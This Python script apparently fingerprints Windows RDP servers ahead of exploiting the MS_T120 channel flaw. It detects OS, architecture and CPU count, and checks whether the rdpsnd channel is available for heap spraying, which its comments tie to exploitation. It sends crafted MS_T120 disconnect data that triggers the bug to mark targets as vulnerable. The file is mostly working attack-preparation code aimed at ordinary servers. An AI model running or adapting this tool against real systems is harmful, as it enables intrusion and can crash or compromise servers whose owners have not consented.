#!/usr/bin/env python

from myrdp import create_rdp, default_t120_channels
import sys
import socket
import time
import threading
from struct import pack, unpack

t120_disconnect_data_64 = b'\x00'*8 + pack('<I', 2) + b'\x00'*20
t120_disconnect_data_32 = b'\x00'*4 + pack('<I', 2) + b'\x00'*8

result_available = threading.Event()

rdpsnd_channel_id = 0

# variable for detecting target OS with refresh rect command
do_detect_os = False
detected_os = None
# if has_rdpsnd is False, cannot detect (might have rdpsnd channel but "Windows Audio" service is not started)
# brutal method is spamming the rdpsnd channel until target out of memory. then try new connection (fail = has_rdpsnd)
#    problem: target memory amount is unknown.
has_rdpsnd = False

has_fastpath_data = False

def on_channel_data(channel_id, data):
    if channel_id == rdpsnd_channel_id:
        global has_rdpsnd
        if not has_rdpsnd:
            has_rdpsnd = True
            result_available.set()

def on_fastpath_data(data, updateCode, fragment, isCompress):
    # Note: data is fpOutputUpdates (TS_FP_UPDATE)
    #print('fast path: len: {}, code: {}, fragment: {}, compress: {}'.format(len(data), updateCode, fragment, isCompress))
    global do_detect_os, has_fastpath_data
    if not has_fastpath_data:
        has_fastpath_data = True
    if do_detect_os:
        if updateCode == 0:
            global detected_os
            # Note:
            # - below length check is for no compression
            # - the data might be depended on capability in handshake process
            ldata = len(data)
            if ldata == 699:
                detected_os = 'Windows 2008 R2'
            elif ldata == 465:
                detected_os = 'Windows 2008'
            elif ldata == 1081:
                detected_os = 'Windows 7'
            else:
                detected_os = 'No match. data len is {}'.format(len(data))
            result_available.set()
            do_detect_os = False

def on_disconnected(reason):
    global connected
    connected = False
    result_available.set()

def create_rdp_connection(host):
    global rdpsnd_channel_id
    rdp = create_rdp(host, default_t120_channels, req_ssl=True, verbose=False)
    #print('connection established. recving data from server')
    rdpsnd_channel_id = rdp.channel_ids[1]
    rdp.start_recv_loop(on_channel_data, on_fastpath_data, on_disconnected)
    rdp.wait_for_rdpdr_client_id()

    print('Wait 1 seconds... let server send all display output to us')
    time.sleep(1)

    return rdp


host = sys.argv[1]

rdp = create_rdp_connection(host)
t120_channel_id = rdp.channel_ids[4]
connected = True


print('sending refresh rect to detect logo')
result_available.clear()
do_detect_os = True
rdp.send_refresh_rect([pack('<HHHH', 480, 550, 525, 565)])
if result_available.wait(timeout=5):
    print('Target OS: {}'.format(detected_os))
else:
    print('Fail to detect target OS: No response from server in 5 seconds!!!')


# click on Windows Ease of Access button
# need "Windows Audio" service and "fDisableCam=0" to get the response
# while only "fDisableCam=0" is enough to exploit using rdpsnd for heap spraying
# first time, doing this might get no response (don't know why)
print('click on Windows Ease of Access button to detect rdpsnd')
result_available.clear()
rdp.send_pkt_mouse_click(55, 552)
result_available.wait(timeout=3)
print('rdpsnd channel: {}'.format('Availble' if has_rdpsnd else "don't know"))

# send to MS_T120 channel to detect target architecture (32 or 64 bit)
# win7 x86. buffer size is 4148. opcode offset is 4 bytes. disconnect packet expect size = 16 
# win7 x64. buffer size is 4160. opcode offset is 8 bytes. disconnect packet expect size = 32
# first 3 data should be ulong (x, opcode, x) then disconnectCode (int 4 byte)
print('send data to MS_T120 channel to detect architecture')
result_available.clear()
rdp.send_channel_data(t120_channel_id, t120_disconnect_data_64)
result_available.wait(timeout=5)
if connected:
    rdp.send_channel_data(t120_channel_id, t120_disconnect_data_32)
    result_available.wait(timeout=5)
    if connected:
        print('Target is not vulnerable')
        arch = None
    else:
        print('Target architecture: 32 bit (vulnerable)')
        arch = 32
        t120_disconnect_data = t120_disconnect_data_32
else:
    print('Target architecture: 64 bit (vulnerable)')
    arch = 64
    t120_disconnect_data = t120_disconnect_data_64

rdp.disconnect()

# test rdpsnd again
if not has_rdpsnd:
    rdp = create_rdp_connection(host)
    result_available.clear()
    # click on Windows Ease of Access button
    # need "Windows Audio" service and "fDisableCam=0" to get the response
    # while only "fDisableCam=0" is enough to exploit using rdpsnd for heap spraying
    # first time, doing this might get no response (don't know why)
    print('click on Windows Ease of Access button to detect rdpsnd')
    rdp.send_pkt_mouse_click(55, 552)
    result_available.wait(timeout=3)
    print('rdpsnd channel: {}'.format('Availble' if has_rdpsnd else "don't know"))
    rdp.disconnect()


if arch:
    # checking target is uniprocessor or multiprocessor
    rdp = create_rdp_connection(host)
    has_fastpath_data = False

    pkt_click = rdp.create_pkt_mouse_click(55, 552)
    pkt_disconnect = rdp.create_send_channel_data(rdp.channel_ids[4], t120_disconnect_data)
    rdp.send(pkt_click+pkt_disconnect)

    time.sleep(1)
    rdp.close()
    if has_fastpath_data:
        cpu = 'uni'
    else:
        cpu = 'multi'

print('\nResult:')
print('Target OS: {}'.format(detected_os))
print('rdpsnd channel: {}'.format('Availble' if has_rdpsnd else "don't know"))
if arch:
    print('Target architecture: {} bit (vulnerable)'.format(arch))
    print('Target cpu is {}processor'.format(cpu))
else:
    print('Target is not vulnerable')
